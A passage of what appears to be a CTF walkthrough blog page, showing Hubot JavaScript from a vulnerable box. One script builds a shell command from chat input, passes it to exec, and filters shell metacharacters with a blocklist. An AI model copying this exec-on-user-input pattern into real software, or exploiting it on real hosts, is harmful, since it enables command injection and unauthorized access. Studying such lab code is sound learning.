    <span class="nx">exec</span><span class="p">(</span><span class="nx">cmd</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">msg</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
        <span class="nx">msg</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">stderr</span><span class="p">);</span>
      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    	<span class="nx">msg</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;&lt;!=====Contents of file  &#34;</span> <span class="o">+</span> <span class="nx">out</span> <span class="o">+</span> <span class="s2">&#34;=====&gt;&#34;</span><span class="p">);</span>
        <span class="nx">msg</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">stdout</span><span class="p">);</span>
    	<span class="nx">msg</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;&lt;!=====End of file  &#34;</span> <span class="o">+</span> <span class="nx">out</span> <span class="o">+</span> <span class="s2">&#34;=====&gt;&#34;</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">});</span>
  <span class="p">}</span>
  <span class="p">});</span>
<span class="p">};</span>
</code></pre>
                          </td>
                        </tr>
                      </table>
                    </div>
                  </div>
                  <div class="highlight">
                    <div class="chroma">
                      <table class="lntable">
                        <tr>
                          <td class="lntd">
                            <pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre>
                          </td>
                          <td class="lntd">
                            <pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">scripts</span><span class="o">/</span><span class="nx">listof</span><span class="p">.</span><span class="nx">js</span>
<span class="c1">// Description:
</span><span class="c1">// Runs a command on hubot
</span><span class="c1">// TOTAL VIOLATION of any and all security!
</span><span class="c1">//
</span><span class="c1">// Commands:
</span><span class="c1">// hubot run &lt;command&gt; - runs a command on hubot host
</span><span class="c1"></span>
<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">robot</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">user</span> <span class="o">=</span> <span class="s2">&#34;dwight&#34;</span><span class="p">;</span>
  <span class="nx">robot</span><span class="p">.</span><span class="nx">respond</span><span class="p">(</span><span class="s2">&#34;/list(.*)$/i&#34;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">msg</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">out</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">match</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="kd">var</span> <span class="nx">cmd</span><span class="o">=</span><span class="s2">&#34;&#34;</span>

<span class="c1">// Don&#39;t judge me. If it is working, then it ain&#39;t stupid.
</span><span class="c1"></span><span class="k">if</span><span class="p">((</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;;&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;`&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;&amp;&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;$&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;0x0a&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;\\n&#34;</span><span class="p">))</span><span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;*&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;?&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;|&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;[&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;{&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;(&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;\&#34;&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;\\&#34;</span><span class="p">))</span>  <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;&lt;&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;%&#34;</span><span class="p">))</span> <span class="p">){</span>
             <span class="nx">msg</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Stop injecting OS commands!&#34;</span><span class="p">);</span>
             <span class="k">return</span><span class="p">;</span>
     <span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nx">out</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">){</span>
    	<span class="kd">var</span> <span class="nx">dir</span><span class="o">=</span><span class="s2">&#34;/sales/&#34;</span>
    	<span class="nx">msg</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Fetching the directory listing of &#34;</span> <span class="o">+</span> <span class="nx">dir</span><span class="p">);</span>
    	<span class="nx">cmd</span> <span class="o">=</span> <span class="s2">&#34;ls -la&#34;</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span><span class="s2">&#34;/home/&#34;</span><span class="o">+</span><span class="nx">user</span><span class="o">+</span> <span class="nx">dir</span><span class="p">;</span>
    <span class="p">}</span>
   <span class="k">if</span><span class="p">(</span><span class="nx">out</span> <span class="o">!=</span><span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
    	<span class="nx">msg</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Fetching the directory listing of &#34;</span> <span class="o">+</span> <span class="nx">out</span><span class="p">);</span>
    	<span class="nx">cmd</span> <span class="o">=</span> <span class="s2">&#34;ls -la&#34;</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span><span class="s2">&#34;/home/&#34;</span><span class="o">+</span><span class="nx">user</span><span class="o">+</span><span class="s2">&#34;/sales/&#34;</span><span class="o">+</span><span class="nx">out</span><span class="p">.</span><span class="nx">trim</span><span class="p">();</span>
    <span class="p">}</span>
    	<span class="kd">var</span> <span class="nx">exec</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">;</span>
    	<span class="nx">exec</span><span class="p">(</span><span class="nx">cmd</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">msg</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
        <span class="nx">msg</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">stderr</span><span class="p">);</span>
      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">msg</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">stdout</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">});</span>
  <span class="p">});</span>
<span class="p">};</span>
</code></pre>
                          </td>
                        </tr>
                      </table>
                    </div>
                  </div>
                </div>
              </div>
            </p>
          </article>

          <script>
            'use strict';

            function wrap(el, wrapper) {
              el.parentNode.insertBefore(wrapper, el);
              wrapper.appendChild(el);
            }

            (function () {
              var singleContentsElem = document.querySelector('.single__contents');
              singleContentsElem ?
                singleContentsElem.querySelectorAll('pre > code').forEach(function (elem) {
                  var dataLang = elem.getAttribute('data-lang');
                  var dataLangWrapper = document.createElement('div');
                  var code = null;
                  var codeTitle = null;

                  if (dataLang && dataLang.includes(':')) {
                    code = dataLang.split(':')[0];
                    codeTitle = dataLang.split(':')[1];

                    dataLangWrapper.className = 'language-' + code;
                    dataLangWrapper.setAttribute('data-lang', codeTitle);

                    elem.className = 'language-' + code;
                    elem.setAttribute('data-lang', codeTitle);
                    elem.setAttribute('id', codeTitle);
                  } else if (!dataLang) {
                    dataLangWrapper.setAttribute('data-lang', 'Code');
                    dataLangWrapper.className = 'language-code';
                  }

                  if (!dataLang || codeTitle) {
                    wrap(elem.parentNode, dataLangWrapper);
                  }

                }) : null;
            })();

            var langCodeElem = document.querySelectorAll('.language-code');
            langCodeElem ? langCodeElem.forEach(function (elem) {
              var newElem = document.createElement('span');
              newElem.className = 'copy-to-clipboard';
              newElem.setAttribute('title', 'Copy to clipboard');
              elem.append(newElem);
            }) : null;
          </script>

          <div class="donation">
            <div class="donation__message">
              Connect to me
            </div>
            <div class="donation__icons">
              <a href="https://www.linkedin.com/in/ian-levy-schlupp/"
                target="_blank" rel="noreferer" title="LinkedIn" aria-label="LinkedIn Share Button"
                class="donation__item" data-type="share">
                <svg data-name="linkedin" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35"
                  fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                  <path
                    d="m23.994 24v-.001h.006v-8.802c0-4.306-.927-7.623-5.961-7.623-2.42 0-4.044 1.328-4.707 2.587h-.07v-2.185h-4.773v16.023h4.97v-7.934c0-2.089.396-4.109 2.983-4.109 2.549 0 2.587 2.384 2.587 4.243v7.801z" />
                  <path d="m.396 7.977h4.976v16.023h-4.976z" />
                  <path
                    d="m2.882 0c-1.591 0-2.882 1.291-2.882 2.882s1.291 2.909 2.882 2.909 2.882-1.318 2.882-2.909c-.001-1.591-1.292-2.882-2.882-2.882z" />
                </svg>
              </a>
            </div>
          </div>

          <div class="whoami__gutter"></div>
          <hr class="hr-slash whoami-hr" />
          <section class="whoami">
            <div class="whoami__image-wrapper">
              <img data-src="https://cdn.discordapp.com/attachments/486049699556491264/1023914284335509595/300PX.png" alt="IanLevy" class="lazyload whoami__image" />
            </div>
            
            <div class="whoami__contents">
              <div class="whoami__written-by">
                WRITTEN BY
              </div>
              <div class="whoami__title">

                Ian Levy

              </div>
              <div class="whoami__desc">

                RedTeamer in the making

              </div>
              <div class="whoami__social">

                <a href="https://tryhackme.com/p/PainTensei" title="TryHackMe">
                  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25" height="25" viewBox="0 0 24 24" version="1.1">
                      <path d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.488 4.488 0 0 0-1.68-.69 5.223 5.223 0 0 1 5.096-4.104 5.221 5.221 0 0 1 5.174 4.57 4.489 4.489 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.245 3.245 0 0 1 1.912-.616 3.278 3.278 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.533 4.533 0 0 0-4.428-3.61 4.54 4.54 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0zm5.192 10.64a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.054.514c0 .181.018.353.054.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .309-.296c.08-.124.137-.267.173-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.309-.291.917.917 0 0 0-.46-.108zm6.486 0a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.053.514c0 .181.017.353.053.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .31-.296c.078-.124.136-.267.172-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.308-.291.916.916 0 0 0-.461-.108zm-8.537.068l-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0l-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445c.08 0 .143.028.193.084.05.057.087.127.114.21.026.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.028.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.248.248 0 0 1-.195-.086.584.584 0 0 1-.118-.209 1.245 1.245 0 0 1-.056-.27 2.645 2.645 0 0 1 0-.533c.01-.096.029-.186.056-.27a.583.583 0 0 1 .118-.209.25.25 0 0 1 .195-.084zm6.486 0c.08 0 .144.028.193.084.05.057.087.127.114.21.027.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.027.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.249.249 0 0 1-.195-.086.581.581 0 0 1-.117-.209 1.245 1.245 0 0 1-.056-.27 2.642 2.642 0 0 1 0-.533c.01-.096.028-.186.056-.27a.58.58 0 0 1 .117-.209.25.25 0 0 1 .195-.084zm-2.191 3.51a.93.93 0 0 0-.463.109.908.908 0 0 0-.312.291c-.08.122-.139.263-.175.426a2.383 2.383 0 0 0-.054.514c0 .18.018.353.054.516.036.164.094.308.175.432a.91.91 0 0 0 .312.296.92.92 0 0 0 .463.11c.18 0 .333-.037.46-.11a.892.892 0 0 0 .308-.296 1.32 1.32 0 0 0 .174-.432c.036-.163.054-.335.054-.516 0-.18-.018-.352-.054-.514a1.274 1.274 0 0 0-.174-.426.89.89 0 0 0-.309-.291.918.918 0 0 0-.46-.108zm-6.402.07l-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0l-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0l-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443c.08 0 .144.028.194.085a.605.605 0 0 1 .114.21c.026.083.044.172.053.269a2.639 2.639 0 0 1 0 .532 1.28 1.28 0 0 1-.053.27.585.585 0 0 1-.114.21.244.244 0 0 1-.193.085.25.25 0 0 1-.196-.085.589.589 0 0 1-.117-.21 1.245 1.245 0 0 1-.056-.27 2.597 2.597 0 0 1 0-.532c.01-.097.028-.186.056-.27a.589.589 0 0 1 .117-.209.249.249 0 0 1 .196-.085zm-6.729 3.073a.676.676 0 0 0-.335.078.661.661 0 0 0-.227.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.93.93 0 0 0 .127.313.65.65 0 0 0 .227.215c.092.053.204.08.335.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .225-.215c.057-.09.1-.194.125-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.931.931 0 0 0-.125-.31.658.658 0 0 0-.225-.21.667.667 0 0 0-.334-.08zm3.086 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.907.907 0 0 0-.127.31 1.69 1.69 0 0 0-.04.373c0 .131.013.256.04.375a.928.928 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.752 1.752 0 0 0 0-.748.94.94 0 0 0-.126-.31.657.657 0 0 0-.224-.21.667.667 0 0 0-.334-.08zm5.108 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.931.931 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08.13 0 .243-.027.334-.08a.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.943.943 0 0 0-.126-.31.657.657 0 0 0-.224-.21.668.668 0 0 0-.334-.08zm-6.658.05l-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0l-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0l-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322c.058 0 .105.02.14.062a.421.421 0 0 1 .083.151.96.96 0 0 1 .04.196 1.932 1.932 0 0 1 0 .386.954.954 0 0 1-.04.197.421.421 0 0 1-.083.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.427.427 0 0 1-.085-.153.887.887 0 0 1-.041-.197 1.96 1.96 0 0 1 0-.386.893.893 0 0 1 .04-.196.42.42 0 0 1 .086-.151.181.181 0 0 1 .141-.062zm3.086 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.94.94 0 0 1 .04.196 1.906 1.906 0 0 1 0 .386.93.93 0 0 1-.04.197.421.421 0 0 1-.082.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.42.42 0 0 1-.086-.153.846.846 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.849.849 0 0 1 .041-.196.42.42 0 0 1 .086-.151.182.182 0 0 1 .141-.062zm5.108 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.92.92 0 0 1 .04.196 1.963 1.963 0 0 1 0 .386.943.943 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.061.18.18 0 0 1-.142-.06.437.437 0 0 1-.085-.153.95.95 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.959.959 0 0 1 .04-.196.47.47 0 0 1 .086-.151.181.181 0 0 1 .142-.062zm-1.684 1.814a.675.675 0 0 0-.336.079.66.66 0 0 0-.227.21.91.91 0 0 0-.127.31 1.731 1.731 0 0 0 0 .748.939.939 0 0 0 .127.314c.059.09.134.162.227.215.093.053.205.08.336.08a.66.66 0 0 0 .334-.08.648.648 0 0 0 .224-.215c.058-.09.1-.195.126-.314a1.737 1.737 0 0 0-.001-.747.928.928 0 0 0-.125-.31.65.65 0 0 0-.224-.211.668.668 0 0 0-.334-.079zm3.063 0a.676.676 0 0 0-.336.079.664.664 0 0 0-.227.21.906.906 0 0 0-.127.31 1.74 1.74 0 0 0 0 .748.936.936 0 0 0 .127.314.66.66 0 0 0 .227.215c.092.053.204.08.336.08a.654.654 0 0 0 .334-.08.648.648 0 0 0 .223-.215c.058-.09.1-.195.126-.314a1.74 1.74 0 0 0 0-.747.928.928 0 0 0-.126-.31.65.65 0 0 0-.223-.211.666.666 0 0 0-.334-.079zm-1.545.05l-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.91.91 0 0 1 .04.195 1.966 1.966 0 0 1 0 .387.951.951 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.06.18.18 0 0 1-.142-.06.428.428 0 0 1-.085-.152.914.914 0 0 1-.04-.197 1.96 1.96 0 0 1-.011-.195c0-.058.003-.122.01-.192a.923.923 0 0 1 .041-.195c.02-.06.048-.11.085-.152a.181.181 0 0 1 .142-.061zm3.063 0c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.94.94 0 0 1 .04.195 1.91 1.91 0 0 1 0 .387.93.93 0 0 1-.04.197.422.422 0 0 1-.083.152.175.175 0 0 1-.14.06.18.18 0 0 1-.141-.06.423.423 0 0 1-.085-.152.907.907 0 0 1-.04-.197 1.95 1.95 0 0 1 0-.387.915.915 0 0 1 .04-.195c.02-.06.048-.11.085-.152a.182.182 0 0 1 .142-.061zm-9.713.185a.465.465 0 0 0-.232.055.456.456 0 0 0-.157.146.627.627 0 0 0-.089.215 1.168 1.168 0 0 0-.027.259c0 .09.009.177.027.26a.648.648 0 0 0 .089.216c.04.063.093.112.157.149a.459.459 0 0 0 .232.056c.09 0 .168-.02.231-.056a.45.45 0 0 0 .156-.149.67.67 0 0 0 .087-.217 1.218 1.218 0 0 0 0-.518.647.647 0 0 0-.087-.215.448.448 0 0 0-.156-.146.458.458 0 0 0-.23-.055zm1.052.035l-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224c.04 0 .073.014.097.042a.284.284 0 0 1 .057.105.69.69 0 0 1 .028.136c.004.049.007.092.007.133 0 .04-.003.086-.007.135a.684.684 0 0 1-.028.136.285.285 0 0 1-.057.105.123.123 0 0 1-.097.043.125.125 0 0 1-.098-.043.298.298 0 0 1-.059-.105.612.612 0 0 1-.028-.136 1.39 1.39 0 0 1 0-.268.62.62 0 0 1 .028-.136.297.297 0 0 1 .06-.105.125.125 0 0 1 .097-.042zm3.775 1.394a.463.463 0 0 0-.232.054.452.452 0 0 0-.157.146.621.621 0 0 0-.088.214 1.19 1.19 0 0 0 0 .519.641.641 0 0 0 .088.217.46.46 0 0 0 .157.15.458.458 0 0 0 .232.054.454.454 0 0 0 .232-.055.45.45 0 0 0 .155-.149.664.664 0 0 0 .087-.217 1.189 1.189 0 0 0 0-.519.642.642 0 0 0-.087-.214.446.446 0 0 0-.155-.146.459.459 0 0 0-.232-.054zm1.052.034l-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223c.04 0 .073.014.098.043a.3.3 0 0 1 .057.105.643.643 0 0 1 .027.135 1.31 1.31 0 0 1 0 .268.654.654 0 0 1-.027.137.307.307 0 0 1-.057.105.124.124 0 0 1-.098.042.125.125 0 0 1-.098-.042.293.293 0 0 1-.059-.105.618.618 0 0 1-.028-.137 1.364 1.364 0 0 1 0-.268.612.612 0 0 1 .028-.135.287.287 0 0 1 .06-.105.123.123 0 0 1 .097-.043z"/>
                  </svg>
                </a>

                <a href="https://osu.ppy.sh/users/8036887" title="osu" aria-label="osu">
                  <img src="https://upload.wikimedia.org/wikipedia/commons/2/2c/Osu%21_simplified_logo_%282016%29.svg" data-name="osu" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="25" height="25">
                </a>

                <a href="https://twitter.com/PainTensei551" title="twitter" aria-label="twitter">
                  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25"
                    height="25" viewBox="0 0 32 32" version="1.1">
                      <path fill="currentColor"
                        d="M 28 8.558594 C 27.117188 8.949219 26.167969 9.214844 25.171875 9.332031 C 26.1875 8.722656 26.96875 7.757812 27.335938 6.609375 C 26.386719 7.171875 25.332031 7.582031 24.210938 7.804688 C 23.3125 6.847656 22.03125 6.246094 20.617188 6.246094 C 17.898438 6.246094 15.691406 8.453125 15.691406 11.171875 C 15.691406 11.558594 15.734375 11.933594 15.820312 12.292969 C 11.726562 12.089844 8.097656 10.128906 5.671875 7.148438 C 5.246094 7.875 5.003906 8.722656 5.003906 9.625 C 5.003906 11.332031 5.871094 12.839844 7.195312 13.722656 C 6.386719 13.695312 5.628906 13.476562 4.964844 13.105469 C 4.964844 13.128906 4.964844 13.148438 4.964844 13.167969 C 4.964844 15.554688 6.660156 17.546875 8.914062 17.996094 C 8.5 18.109375 8.066406 18.171875 7.617188 18.171875 C 7.300781 18.171875 6.988281 18.140625 6.691406 18.082031 C 7.316406 20.039062 9.136719 21.460938 11.289062 21.503906 C 9.605469 22.824219 7.480469 23.609375 5.175781 23.609375 C 4.777344 23.609375 4.386719 23.585938 4 23.539062 C 6.179688 24.9375 8.765625 25.753906 11.546875 25.753906 C 20.605469 25.753906 25.558594 18.25 25.558594 11.742188 C 25.558594 11.53125 25.550781 11.316406 25.542969 11.105469 C 26.503906 10.410156 27.339844 9.542969 28 8.558594 Z M 28 8.558594 " />
                  </svg>
                </a>

              </div>
            </div>
          </section>
          <hr class="hr-slash whoami-hr" />

          <section class="related">

            <h1 class="related__title">
              <hr class="hr-dots" />
              <div>
                Read other posts
              </div>
              <hr class="hr-dots" />
            </h1>
            <ul class="related-ul">

              <li>
                <a href="https://github.com/PainTensei" class="related__link">Hack The Box - Backdoor</a>
              </li>

              <li>
                <a href="https://github.com/PainTensei" class="related__link">Hack The Box - Monitors</a>
              </li>

              <li>
                <a href="https://github.com/PainTensei" class="related__link">Hack The Box - Spectra</a>
              </li>

              <li>
                <a href="https://github.com/PainTensei" class="related__link">Hack The Box - Tenet</a>
              </li>

              <li>
                <a href="https://github.com/PainTensei" class="related__link">TryHackMe - Different
                  CTF</a>
              </li>

            </ul>

          </section>
          <div class="grow"></div>
          <nav class="pagination-single">

            <a href="https://github.com/PainTensei" class="pagination-single__left">
              <div class="pagination-single__icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24">
                  <path fill="none" d="M0 0h24v24H0V0z" />
                  <path fill="currentColor"
                    d="M19 11H7.83l4.88-4.88c.39-.39.39-1.03 0-1.42-.39-.39-1.02-.39-1.41 0l-6.59 6.59c-.39.39-.39 1.02 0 1.41l6.59 6.59c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L7.83 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" />
                </svg>
              </div>
              <div class="pagination-single__left-title">Hack The Box - Meta</div>
            </a>

            <div class="grow"></div>

            <a href="https://github.com/PainTensei" class="pagination-single__right">
              <div class="pagination-single__right-title">Hack The Box - Undetected</div>
              <div class="pagination-single__icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24">
                  <path fill="none" d="M0 0h24v24H0V0z" />
                  <path fill="currentColor"
                    d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z" />
                </svg>
              </div>
            </a>

          </nav>

          <div class="modal micromodal-slide" id="modal" aria-hidden="true">
            <div class="modal__overlay" tabindex="-1" data-micromodal-close>
              <div class="modal__container" role="dialog" aria-modal="true" aria-labelledby="modal-title">

                <div class="modal__content" id="modal-content">
                  <div id="mySwipe" class="swipe">
                    <div class="swipe-wrap">
                    </div>
                  </div>
                </div>

                <span class="modal__items">

                  <span class="modal__header">
                    <div class="modal__paging" title="Page Info" aria-label="Current Page">
                    </div>
                    <div class="modal__icon modal__toolbar modal__toolbar--close" title="Close"
                      aria-label="Close Button" data-micromodal-close>
                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="25" height="25">
                        <path fill="currentColor"
